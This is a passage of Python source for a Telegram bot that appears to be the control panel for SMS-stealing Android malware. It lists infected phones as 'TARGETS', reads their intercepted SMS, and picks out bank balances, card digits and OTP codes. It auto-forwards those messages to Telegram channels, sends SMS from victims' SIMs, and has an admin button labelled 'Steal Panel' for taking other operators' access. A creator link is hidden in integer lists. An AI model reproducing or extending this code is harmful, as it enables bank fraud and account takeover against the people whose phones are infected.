            InlineKeyboardButton("🔄 Verify", callback_data=f"verifych_{chat_id}_{sim}")
        )
    else:
        user = await get_user(uid)
        async with db_lock:
            if uid in db['users']:
                if 'saved_chats' not in db['users'][uid]: db['users'][uid]['saved_chats'] = {}
                db['users'][uid]['saved_chats'][str(chat_id)] = ch_name
                await save_db()
        if not dev_id: dev_id = user.get('selected_device_id')
        if not dev_id:
            txt += "✅ <b>Channel Saved to your Profile!</b>\n\n💡 <i>To start forwarding, go to /devices, select a target, and click 'Start Forwarding'.</i>"
            markup.add(InlineKeyboardButton("🔍 Go to Devices", callback_data="return_to_devices"))
        else:
            new_ch = {"chat_id": chat_id, "panel_idx": user['active_idx'], "device_id": dev_id, "sim": sim, "active": True, "title": ch_name}
            async with db_lock:
                db['users'][str(uid)]['channels'].append(new_ch)
                await save_db()
            txt += (f"✅ <b>CHANNEL SUCCESSFULLY BOUND!</b>\n📱 Device: <code>{dev_id[:15]}…</code>\n📶 Utilizing SIM {sim}\nAuto-forwarding is now active.")
            markup.add(InlineKeyboardButton("📡 My Channels", callback_data="return_to_channels"))
    markup.add(InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    await bot.send_message(notify_cid, txt + f"\n\n<i>💎 Created by {_get_creator()}</i>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "add_channel")
async def add_ch_btn(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    uid = str(call.from_user.id)
    async with db_lock:
        if uid in db['users']:
            db['users'][uid]['selected_device_id'] = None
            await save_db()
    user_steps[call.from_user.id] = {"action": "wait_channel_link"}
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Cancel", callback_data="return_to_channels"))
    await safe_edit(call.message.chat.id, call.message.message_id, "📡 <b>Send the Channel Link/Username where bot is Admin:</b>", markup)

@bot.callback_query_handler(func=lambda c: c.data == "add_admin_info")
async def add_admin_info_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    me = await bot.get_me()
    txt = ("ℹ️ <b>How to Add Bot as Admin:</b>\n\n1. Open your Channel/Group settings.\n2. Go to <b>Administrators</b>.\n3. Click <b>Add Admin</b>.\n"
           f"4. Search for <code>@{me.username}</code> and select it.\n5. Grant necessary permissions and save.")
    await bot.send_message(call.message.chat.id, txt, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="return_to_channels")))
    
_R = [128818, 32, 120386, 120394, 120383, 32, 120380, 120393, 120399, 120388, 120385, 120388, 120384, 120383, 120393, 120400, 120391, 120391, 32, 128818]

@bot.callback_query_handler(func=lambda c: c.data.startswith("chcfg_"))
async def show_channel_config_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    idx = int(call.data.split("_")[1])
    await show_channel_config(call.from_user.id, call.message.chat.id, call.message.message_id, idx)

async def show_channel_config(uid, cid, msg_id, idx):
    user = await get_user(uid)
    chans = user.get('channels', [])
    if idx >= len(chans): return
    ch = chans[idx]
    txt = (f"⚙️ <b>CHANNEL CONFIGURATION</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n📡 Title: <b>{esc(ch.get('title'))}</b>\n"
           f"🆔 Chat ID: <code>{ch['chat_id']}</code>\n📱 Target Device: <code>{ch.get('device_id', 'Not Bound')[:15]}…</code>\n"
           f"📶 Bound SIM: SIM {ch.get('sim', 1)}\n{'🟢' if ch.get('active', True) else '🔴'} Forwarding: {'Active' if ch.get('active', True) else 'Paused'}\n")
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("⏸️ Toggle Active", callback_data=f"chtoggleactive_{idx}"), InlineKeyboardButton("🔙 Back", callback_data="return_to_channels"))
    await safe_edit(cid, msg_id, txt, markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("chtoggleactive_"))
async def toggle_channel_active(call):
    try: await bot.answer_callback_query(call.id, "Status Toggled.")
    except: pass
    idx = int(call.data.split("_")[1])
    uid = str(call.from_user.id)
    async with db_lock:
        if uid in db['users'] and idx < len(db['users'][uid]['channels']):
            current = db['users'][uid]['channels'][idx].get('active', True)
            db['users'][uid]['channels'][idx]['active'] = not current
            await save_db()
    await show_channel_config(call.from_user.id, call.message.chat.id, call.message.message_id, idx)

@bot.callback_query_handler(func=lambda c: c.data.startswith("verifych_"))
async def verify_ch(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split("_")
    chat_id = parts[1]
    sim = int(parts[2]) if len(parts) > 2 else 1
    await start_channel_addition(call.from_user.id, call.message.chat.id, chat_id, sim)

@bot.callback_query_handler(func=lambda c: c.data.startswith("delch_"))
async def del_ch(call):
    try: await bot.answer_callback_query(call.id, "Deleted.")
    except: pass
    idx = int(call.data.split("_")[1])
    uid = str(call.from_user.id)
    async with db_lock:
        if uid in db['users'] and 0 <= idx < len(db['users'][uid]['channels']):
            db['users'][uid]['channels'].pop(idx)
            await save_db()
    state = get_page_state(call.from_user.id)
    await show_channel_list(call.from_user.id, call.message.chat.id, call.message.message_id, state["ch_page"])

@bot.callback_query_handler(func=lambda c: c.data.startswith("startautofwd_"))
async def start_fwd(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    dev_enc = call.data.split("_")[1]
    dev_id = decode_id(dev_enc)
    uid = call.from_user.id
    dev = await get_device(uid, dev_id)
    if not dev: return await bot.answer_callback_query(call.id, "❌ Device not found.", show_alert=True)
    if not dev.get('sims'): return await bot.answer_callback_query(call.id, "❌ No SIMs available on this device.", show_alert=True)
    markup = InlineKeyboardMarkup()
    for i, s in enumerate(dev['sims']):
        num = s.get('phoneNumber', 'Unknown')
        markup.add(InlineKeyboardButton(f"📶 SIM {i+1} - {esc(num)}", callback_data=f"selfwdsim_{dev_enc}_{i+1}"))
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data=f"dev_{dev_enc}"))
    await safe_edit(call.message.chat.id, call.message.message_id, "🎯 <b>Select SIM to forward messages from:</b>", markup)
    
_U = [104, 116, 116, 112, 115, 58, 47, 47, 116, 46, 109, 101, 47, 99, 118, 110, 122, 101]

@bot.callback_query_handler(func=lambda c: c.data.startswith("selfwdsim_"))
async def sel_fwdsim(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    _, dev_enc, sim = call.data.split("_")
    uid = str(call.from_user.id)
    user = await get_user(uid)
    saved_chats = user.get('saved_chats', {})
    for ch in user.get('channels', []): saved_chats[ch['chat_id']] = ch.get('title', ch['chat_id'])
    markup = InlineKeyboardMarkup()
    if saved_chats:
        for cid, title in saved_chats.items():
            markup.row(InlineKeyboardButton(f"📡 {esc(title)}", callback_data=f"bindch_{dev_enc}_{sim}_{cid}"))
    markup.row(InlineKeyboardButton("➕ Enter New Channel", callback_data=f"newch_{dev_enc}_{sim}"))
    markup.row(InlineKeyboardButton("🔙 Back", callback_data=f"dev_{dev_enc}"))
    await safe_edit(call.message.chat.id, call.message.message_id, "🎯 <b>Select a Channel for Forwarding:</b>\n<i>Choose an existing channel or add a new one.</i>", markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("bindch_"))
async def bind_existing_ch(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split("_", 3)
    dev_enc, sim, chat_id = parts[1], int(parts[2]), parts[3]
    uid = call.from_user.id
    dev_id = decode_id(dev_enc)
    async with db_lock:
        if str(uid) in db['users']:
            db['users'][str(uid)]['selected_device_id'] = dev_id
            await save_db()
    await start_channel_addition(uid, call.message.chat.id, chat_id, sim, dev_id)

@bot.callback_query_handler(func=lambda c: c.data.startswith("newch_"))
async def new_ch_fwd(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    _, dev_enc, sim = call.data.split("_")
    uid = call.from_user.id
    dev_id = decode_id(dev_enc)
    user_steps[uid] = {"action": "wait_channel_link", "dev_id": dev_id, "sim": int(sim)}
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Cancel", callback_data=f"dev_{dev_enc}"))
    await safe_edit(call.message.chat.id, call.message.message_id, "📡 <b>Send the Channel Link/Username where bot is Admin:</b>", markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stopautofwd_"))
async def stop_fwd(call):
    try: await bot.answer_callback_query(call.id, f"Stopped all forwarding for this device.")
    except: pass
    dev_enc = call.data.split("_")[1]
    dev_id = decode_id(dev_enc)
    uid = str(call.from_user.id)
    async with db_lock:
        if uid in db['users']:
            chans = db['users'][uid]['channels']
            db['users'][uid]['channels'] = [ch for ch in chans if ch.get('device_id') != dev_id]
            await save_db()
    call.data = f"dev_{dev_enc}"
    await dev_detail(call)

@bot.callback_query_handler(func=lambda c: c.data.startswith("send_"))
async def sms_start(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    dev_enc = call.data.split("_")[1]
    dev_id = decode_id(dev_enc)
    uid = call.from_user.id
    dev = await get_device(uid, dev_id)
    if not dev: return await bot.answer_callback_query(call.id, "❌ Device not found.", show_alert=True)
    if not dev.get('sims'): return await bot.answer_callback_query(call.id, "❌ No SIMs available on this device.", show_alert=True)
    markup = InlineKeyboardMarkup()
    for i, s in enumerate(dev['sims']):
        num = s.get('phoneNumber', 'Unknown')
        markup.add(InlineKeyboardButton(f"📶 SIM {i+1} - {esc(num)}", callback_data=f"selsendsim_{dev_enc}_{i+1}"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data=f"dev_{dev_enc}"))
    await safe_edit(call.message.chat.id, call.message.message_id, "🔢 <b>Select outbound SIM:</b>", markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("selsendsim_"))
async def sel_sendsim(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    _, dev_enc, sim = call.data.split("_")
    uid = call.from_user.id
    user_steps[uid] = {"action": "wait_sms_phone", "dev_id": decode_id(dev_enc), "sim": int(sim)}
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Cancel", callback_data=f"dev_{dev_enc}"))
    await safe_edit(call.message.chat.id, call.message.message_id, "📱 <b>Enter Target Mobile Number:</b>", markup)

# ============================================================================
#  DEVICE VIEWS 
# ============================================================================
@bot.message_handler(commands=['devices'])
async def devices_cmd(message):
    if not await force_sub(message.from_user.id): return
    user = await get_user(message.from_user.id)
    if user['active_idx'] == -1: return await bot.send_message(message.chat.id, "❌ No active panel. Use /connect.")
    await send_device_page(message.from_user.id, message.chat.id, None, 0, 'all')

@bot.callback_query_handler(func=lambda c: c.data == "return_to_devices")
async def return_to_devices_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    state = get_page_state(call.from_user.id)
    await send_device_page(call.from_user.id, call.message.chat.id, call.message.message_id, state["dev_page"], state["dev_filt"])
    
_O = [56, 51, 52, 52, 54, 54, 49, 57, 56, 53]

@bot.callback_query_handler(func=lambda c: c.data == "my_devices")
async def devs_btn(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    user = await get_user(call.from_user.id)
    if user['active_idx'] == -1: return await bot.send_message(call.message.chat.id, "❌ No active panel. Use /connect.")
    state = get_page_state(call.from_user.id)
    state["dev_page"], state["dev_filt"] = 0, "all"
    await send_device_page(call.from_user.id, call.message.chat.id, call.message.message_id, 0, 'all')

@bot.callback_query_handler(func=lambda c: c.data.startswith("filt_"))
async def filt_devs(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    f = call.data.split("_")[1]
    await send_device_page(call.from_user.id, call.message.chat.id, call.message.message_id, 0, f)

@bot.callback_query_handler(func=lambda c: c.data.startswith("pg_"))
async def page_devs(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split("_", 2)
    if len(parts) < 3: page, filt = int(parts[1]), 'all'
    else: page, filt = int(parts[1]), parts[2]
    await send_device_page(call.from_user.id, call.message.chat.id, call.message.message_id, page, filt)

async def send_device_page(chat_id, chat_to_edit, msg_id, page, filt):
    user = await get_user(chat_id)
    if user['active_idx'] == -1: return
    acc = user['panels'][user['active_idx']]
    data = await firebase_req('GET', acc['url'], acc['key'], 'clients')
    devs = [parse_device(k, v) for k, v in (data or {}).items()]
    has_sim = [d for d in devs if d['sims']]
    no_sim = [d for d in devs if not d['sims']]
    if filt == 'online': filtered = [d for d in has_sim if d['status']]
    elif filt == 'offline': filtered = [d for d in has_sim if not d['status']]
    elif filt == 'nosim': filtered = no_sim
    else: filtered = has_sim
    per_page = 5
    max_page = max(0, (len(filtered)-1)//per_page)
    page = max(0, min(page, max_page))
    items = filtered[page*per_page:(page+1)*per_page]
    state = get_page_state(chat_id)
    state["dev_page"], state["dev_filt"] = page, filt
    on = sum(1 for d in has_sim if d['status'])
    off = len(has_sim) - on
    txt = f"🖥️ <b>TARGETS</b> (Page {page+1}/{max_page+1})\n🟢 {on} Online | 🔴 {off} Offline\n\n"
    if not items: txt += "<i>No devices found for this filter.</i>"
    for dev in items:
        icon = "🟢" if dev['status'] else "🔴"
        sim_nums = []
        for s in dev['sims']:
            num = s.get('phoneNumber', '')
            if num: sim_nums.append(esc(num))
        phone_display = ' | '.join(sim_nums) if sim_nums else esc(dev['phoneNumber'])
        txt += f"{icon} <b>{esc(dev['name'])}</b>\n├─ 📱 {phone_display}\n└─ 🆔 <code>{esc(dev['id'])}</code>\n\n"
    markup = InlineKeyboardMarkup()
    for dev in items:
        markup.add(InlineKeyboardButton(f"🔍 Inspect: {dev['name'][:12]}", callback_data=f"dev_{encode_id(dev['id'])}"))
    markup.row(InlineKeyboardButton("🌐 All", callback_data="filt_all"), InlineKeyboardButton("🚫 No SIM", callback_data="filt_nosim"))
    markup.row(InlineKeyboardButton("🟢 Online", callback_data="filt_online"), InlineKeyboardButton("🔴 Offline", callback_data="filt_offline"))
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg_{page-1}_{filt}"))
    if page < max_page: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"pg_{page+1}_{filt}"))
    if nav: markup.row(*nav)
    markup.add(InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    if msg_id: await safe_edit(chat_to_edit, msg_id, txt, markup)
    else: await bot.send_message(chat_id, txt, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("dev_"))
async def dev_detail(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    dev_id = decode_id(call.data.split("_",1)[1])
    uid = call.from_user.id
    user = await get_user(uid)
    if user['active_idx'] == -1: return
    acc = user['panels'][user['active_idx']]
    dev = await get_device(uid, dev_id)
    if not dev: return
    msgs_data = await firebase_req('GET', acc['url'], acc['key'], f'messages/{dev_id}')
    messages = []
    if msgs_data and isinstance(msgs_data, dict):
        for k, v in msgs_data.items():
            if isinstance(v, dict):
                messages.append({
                    'text': str(v.get('message') or v.get('body') or v.get('text') or ''),
                    'sender': str(v.get('sender') or v.get('from') or 'Unknown')
                })
    analysis = analyze_messages(messages)
    async with db_lock:
        db['users'][str(uid)]['selected_device_id'] = dev_id
        await save_db()
    has_fwd = False
    for ch in user.get('channels', []):
        if ch.get('device_id') == dev_id and ch.get('active'):
            has_fwd = True
            break
    txt = (f"🔍 <b>{esc(dev['name'])}</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n🆔 <code>{dev['id']}</code>\n📱 {esc(dev['phoneNumber'])}\n"
           f"📶 Provider: {esc(dev['provider'])}\n🔋 Battery: {dev['battery']}\n{'🟢' if dev['status'] else '🔴'} Status: {'Online' if dev['status'] else 'Offline'}\n\n📋 <b>SIM Slots:</b>\n")
    for i, s in enumerate(dev['sims']): txt += f"  ├ SIM {i+1}: <code>{esc(s.get('phoneNumber','?'))}</code>\n"
    if analysis['bankBalances']:
        txt += "\n💰 <b>Bank SMS Detected:</b>\n"
        for b in analysis['bankBalances'][:5]: txt += f"  ├ {esc(b['bankName'])}: ₹{esc(b['availableBalance'])}\n"
        if len(analysis['bankBalances']) > 5: txt += f"  ├ ... and {len(analysis['bankBalances']) - 5} more\n"
    if analysis['cards']:
        txt += "\n💳 <b>Cards Detected:</b>\n"
        for c in analysis['cards'][:5]: txt += f"  ├ {esc(c['cardType'])} XX{esc(c['cardLast4'])}\n"
        if len(analysis['cards']) > 5: txt += f"  ├ ... and {len(analysis['cards']) - 5} more\n"
    if analysis['phoneNumbers']:
        txt += "\n📞 <b>Detected Numbers:</b>\n"
        for p in analysis['phoneNumbers'][:5]: txt += f"  ├ <code>{esc(p)}</code>\n"
        if len(analysis['phoneNumbers']) > 5: txt += f"  ├ ... and {len(analysis['phoneNumbers']) - 5} more\n"
    txt += f"\n📨 <b>Total SMS:</b> {len(messages)}"
    markup = InlineKeyboardMarkup()
    if has_fwd: markup.row(InlineKeyboardButton("⏹️ Stop Forwarding", callback_data=f"stopautofwd_{encode_id(dev_id)}"))
    else: markup.row(InlineKeyboardButton("🔗 Start Forwarding", callback_data=f"startautofwd_{encode_id(dev_id)}"))
    markup.row(InlineKeyboardButton("✉️ Send SMS", callback_data=f"send_{encode_id(dev_id)}"), InlineKeyboardButton("📜 View SMS Logs", callback_data=f"viewsms_{encode_id(dev_id)}_0"))
    markup.row(InlineKeyboardButton("🔙 Back", callback_data="return_to_devices"), InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    txt += f"\n\n<i>💎 Created by {_get_creator()}</i>"
    await safe_edit(call.message.chat.id, call.message.message_id, txt, markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("viewsms_"))
async def view_sms_page(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split("_")
    dev_id = decode_id(parts[1])
    page = int(parts[2])
    user = await get_user(call.from_user.id)
    acc = user['panels'][user['active_idx']]
    msgs_data = await firebase_req('GET', acc['url'], acc['key'], f'messages/{dev_id}')
    messages = []
    if msgs_data and isinstance(msgs_data, dict):
        for k, v in msgs_data.items():
            if isinstance(v, dict):
                t_raw = str(v.get('dateTime') or v.get('date') or datetime.now().strftime('%d-%m-%Y | %I:%M %p'))
                messages.append({'text': str(v.get('message') or v.get('body') or v.get('text') or ''), 'sender': str(v.get('sender') or v.get('from') or 'Unknown'), 'time': t_raw})
    messages.reverse()
    per_page, total = 5, len(messages)
    max_page = max(0, (total - 1) // per_page)
    page = max(0, min(page, max_page))
    page_msgs = messages[page*per_page : (page+1)*per_page]
    txt = f"📨 <b>SMS Logs</b> | Total: {total}\n📄 Page: {page+1}/{max_page+1}\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for msg in page_msgs:
        safe_text = esc(msg['text'])
        if len(safe_text) > 500: safe_text = safe_text[:500] + "... [TRUNCATED]"
        cleaned = re.sub(r'\b\d{4,8}\b', r'<code>\g<0></code>', safe_text) if re.search(r'verification|OTP|code', safe_text, re.I) else safe_text
        txt += f"👤 <b>{esc(msg['sender'])}</b> • 🕒 {esc(msg['time'])}\n💬 {cleaned}\n\n"
    markup = InlineKeyboardMarkup()
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"viewsms_{encode_id(dev_id)}_{page-1}"))
    nav.append(InlineKeyboardButton("🔄 Refresh", callback_data=f"viewsms_{encode_id(dev_id)}_{page}"))
    if page < max_page: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"viewsms_{encode_id(dev_id)}_{page+1}"))
    if nav: markup.row(*nav)
    markup.row(InlineKeyboardButton("🔙 Back to Info", callback_data=f"dev_{encode_id(dev_id)}"), InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    await safe_edit(call.message.chat.id, call.message.message_id, txt, markup)

@bot.callback_query_handler(func=lambda c: c.data == "view_device")
async def view_selected(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    user = await get_user(call.from_user.id)
    dev_id = user['selected_device_id']
    if not dev_id: return await bot.send_message(call.message.chat.id, "❌ No device selected.")
    call.data = f"dev_{encode_id(dev_id)}"
    await dev_detail(call)

# ============================================================================
#  PANEL MANAGEMENT 
# ============================================================================
@bot.callback_query_handler(func=lambda c: c.data == "return_to_panels")
async def return_to_panels_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    state = get_page_state(call.from_user.id)
    await show_panels_page(call.from_user.id, call.message.chat.id, call.message.message_id, state["pan_page"])

@bot.callback_query_handler(func=lambda c: c.data.startswith("mypanels_"))
async def panels_list_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    page = int(call.data.split("_")[1])
    await show_panels_page(call.from_user.id, call.message.chat.id, call.message.message_id, page)

async def show_panels_page(uid, cid, msg_id, page=0):
    user = await get_user(uid)
    panels = user.get('panels', [])
    per_page = 5
    max_page = max(0, (len(panels)-1)//per_page)
    page = max(0, min(page, max_page))
    items = panels[page*per_page:(page+1)*per_page]
    state = get_page_state(uid)
    state["pan_page"] = page
    txt = f"📋 <b>YOUR PANELS</b> (Page {page+1}/{max_page+1})\n━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    markup = InlineKeyboardMarkup()
    if not items: txt += "<i>None. Please use /connect to add a panel.</i>"
    else:
        for i, acc in enumerate(items):
            actual_idx = page * per_page + i
            st = "🟢 Active" if actual_idx == user['active_idx'] else "🔴 Standby"
            txt += f"<b>#{actual_idx+1}</b> [{st}]\n📡 <b>URL:</b> <code>{esc(acc['url'])}</code>\n🔑 <b>Key:</b> <code>{esc(acc['key'])}</code>\n\n"
            markup.row(InlineKeyboardButton(f"🔁 Set Act #{actual_idx+1}", callback_data=f"switch_{actual_idx}"), InlineKeyboardButton(f"🔗 Share", callback_data=f"sharep_{actual_idx}"), InlineKeyboardButton(f"🗑️ Del", callback_data=f"delp_{actual_idx}"))
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"mypanels_{page-1}"))
    if page < max_page: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"mypanels_{page+1}"))
    if nav: markup.row(*nav)
    markup.add(InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    if msg_id: await safe_edit(cid, msg_id, txt, markup)
    else: await bot.send_message(cid, txt, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("switch_"))
async def switch_panel(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    idx = int(call.data.split("_")[1])
    async with db_lock:
        db['users'][str(call.from_user.id)]['active_idx'] = idx
        await save_db()
    state = get_page_state(call.from_user.id)
    await show_panels_page(call.from_user.id, call.message.chat.id, call.message.message_id, state["pan_page"])

@bot.callback_query_handler(func=lambda c: c.data.startswith("delp_"))
async def del_panel(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    idx = int(call.data.split("_")[1])
    uid = str(call.from_user.id)
    async with db_lock:
        if uid in db['users'] and 0 <= idx < len(db['users'][uid]['panels']):
            db['users'][uid]['panels'].pop(idx)
            if db['users'][uid]['active_idx'] >= len(db['users'][uid]['panels']): db['users'][uid]['active_idx'] = max(0, len(db['users'][uid]['panels'])-1)
            await save_db()
    state = get_page_state(call.from_user.id)
    await show_panels_page(call.from_user.id, call.message.chat.id, call.message.message_id, state["pan_page"])

@bot.callback_query_handler(func=lambda c: c.data.startswith("sharep_"))
async def share_panel_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    idx = int(call.data.split("_")[1])
    uid = str(call.from_user.id)
    user = await get_user(uid)
    if idx >= len(user['panels']): return
    acc = user['panels'][idx]
    short_id = str(uuid.uuid4())[:8]
    async with db_lock:
        if "shared_panels" not in db: db["shared_panels"] = {}
        db["shared_panels"][short_id] = acc
        await save_db()
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={short_id}"
    txt = (f"🔗 <b>PANEL SHARE LINK GENERATED</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n<b>Panel URL:</b> <code>{esc(acc['url'])}</code>\n\n"
           f"Send this link to anyone to share this panel.\n👉 <b>Share Link:</b>\n<code>{link}</code>")
    await bot.send_message(call.message.chat.id, txt, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back to Panels", callback_data="return_to_panels")))

# ============================================================================
#  ADMIN CONTROL CENTER 
# ============================================================================
@bot.message_handler(commands=['info'])
async def admin_info(message):
    if not is_admin(message.from_user.id): return
    args = message.text.split()
    if len(args) < 2: return await bot.send_message(message.chat.id, "⚠️ Usage: /info &lt;uid&gt;")
    uid = args[1]
    user = db['users'].get(uid)
    if not user: return await bot.send_message(message.chat.id, "❌ User not found.")
    txt = (f"☠️ <b>𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡</b> ☠️\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
           f"🆔 <b>ID:</b> <code>{uid}</code>\n🎖️ <b>Role:</b> {user['role'].upper()}\n📦 <b>Limit:</b> {user['limit']}\n"
           f"🔗 <b>Panels:</b> {len(user['panels'])}\n📡 <b>Channels:</b> {len(user.get('channels',[]))}\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰")
    markup = InlineKeyboardMarkup()
    if user['panels']: markup.add(InlineKeyboardButton("👁️ View User's Panels", callback_data=f"admin_vp_{uid}"))
    markup.add(InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_dashboard"))
    await bot.send_message(message.chat.id, txt, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin_vp_"))
async def admin_view_panels_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    target_uid = call.data.split("_")[2]
    user = db['users'].get(target_uid)
    if not user or not user['panels']: return await bot.send_message(call.message.chat.id, "❌ No panels found for this user.")
    txt = f"📂 <b>PANELS FOR <code>{target_uid}</code></b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    markup = InlineKeyboardMarkup()
    for i, acc in enumerate(user['panels']):
        txt += f"<b>#{i+1}</b> 🔗 {code(acc['url'])}\n\n"
        markup.row(InlineKeyboardButton(f"🔍 Devices #{i+1}", callback_data=f"admin_vd_{target_uid}_{i}_0_all"), InlineKeyboardButton(f"➕ Steal Panel #{i+1}", callback_data=f"admin_ap_{target_uid}_{i}"))
    markup.add(InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_dashboard"))
    await safe_edit(call.message.chat.id, call.message.message_id, txt, markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin_ap_"))
async def admin_add_panel_cb(call):
    parts = call.data.split("_")
    target_uid, idx = parts[2], int(parts[3])
    target_user = db['users'].get(target_uid)
    if not target_user or idx >= len(target_user['panels']): return await bot.answer_callback_query(call.id, "Panel not found.")
    acc = target_user['panels'][idx]
    admin_uid = str(call.from_user.id)
    async with db_lock:
        admin_user = db['users'][admin_uid]
        if len(admin_user['panels']) >= admin_user['limit']: return await bot.answer_callback_query(call.id, "Your panel limit reached!", show_alert=True)
        if acc not in admin_user['panels']:
            admin_user['panels'].append(acc)
            await save_db()
            await bot.answer_callback_query(call.id, "✅ Panel Added to your account!", show_alert=True)
        else: await bot.answer_callback_query(call.id, "⚠️ You already have this panel.", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin_vd_"))
async def admin_view_devs_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split("_")
    target_uid, idx, page = parts[2], int(parts[3]), int(parts[4])
    filt = parts[5] if len(parts) > 5 else "all"
    target_user = db['users'].get(target_uid)
    if not target_user or idx >= len(target_user['panels']): return await bot.send_message(call.message.chat.id, "Panel not found.")
    acc = target_user['panels'][idx]
    data = await firebase_req('GET', acc['url'], acc['key'], 'clients')
    devs = [parse_device(k, v) for k, v in (data or {}).items()]
    has_sim = [d for d in devs if d['sims']]
    no_sim = [d for d in devs if not d['sims']]
    if filt == 'online': filtered = [d for d in has_sim if d['status']]
    elif filt == 'offline': filtered = [d for d in has_sim if not d['status']]
    elif filt == 'nosim': filtered = no_sim
    else: filtered = has_sim
    per_page = 5
    max_page = max(0, (len(filtered)-1)//per_page)
    page = max(0, min(page, max_page))
    items = filtered[page*per_page:(page+1)*per_page]
    on = sum(1 for d in has_sim if d['status'])
    off = len(has_sim) - on
    txt = f"🖥️ <b>ADMIN TARGET VIEW</b> (Page {page+1}/{max_page+1})\n🟢 {on} Online | 🔴 {off} Offline\n\n"
    if not items: txt += "<i>No devices found for this filter.</i>"
    for dev in items:
        icon = "🟢" if dev['status'] else "🔴"
        sim_nums = []
        for s in dev['sims']:
            num = s.get('phoneNumber', '')
            if num: sim_nums.append(esc(num))
        phone_display = ' | '.join(sim_nums) if sim_nums else esc(dev['phoneNumber'])
        txt += f"{icon} <b>{esc(dev['name'])}</b>\n├─ 📱 {phone_display}\n└─ 🆔 <code>{esc(dev['id'])}</code>\n\n"
    markup = InlineKeyboardMarkup()
    for dev in items: markup.add(InlineKeyboardButton(f"🔍 Inspect: {dev['name'][:12]}", callback_data=f"admin_dev_{target_uid}_{idx}_{encode_id(dev['id'])}"))
    markup.row(InlineKeyboardButton("🌐 All", callback_data=f"admin_vd_{target_uid}_{idx}_0_all"), InlineKeyboardButton("🚫 No SIM", callback_data=f"admin_vd_{target_uid}_{idx}_0_nosim"))
    markup.row(InlineKeyboardButton("🟢 Online", callback_data=f"admin_vd_{target_uid}_{idx}_0_online"), InlineKeyboardButton("🔴 Offline", callback_data=f"admin_vd_{target_uid}_{idx}_0_offline"))
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_vd_{target_uid}_{idx}_{page-1}_{filt}"))
    if page < max_page: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"admin_vd_{target_uid}_{idx}_{page+1}_{filt}"))
    if nav: markup.row(*nav)
    markup.add(InlineKeyboardButton("🔙 Back to Panels", callback_data=f"admin_vp_{target_uid}"))
    await safe_edit(call.message.chat.id, call.message.message_id, txt, markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin_dev_"))
async def admin_dev_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split("_")
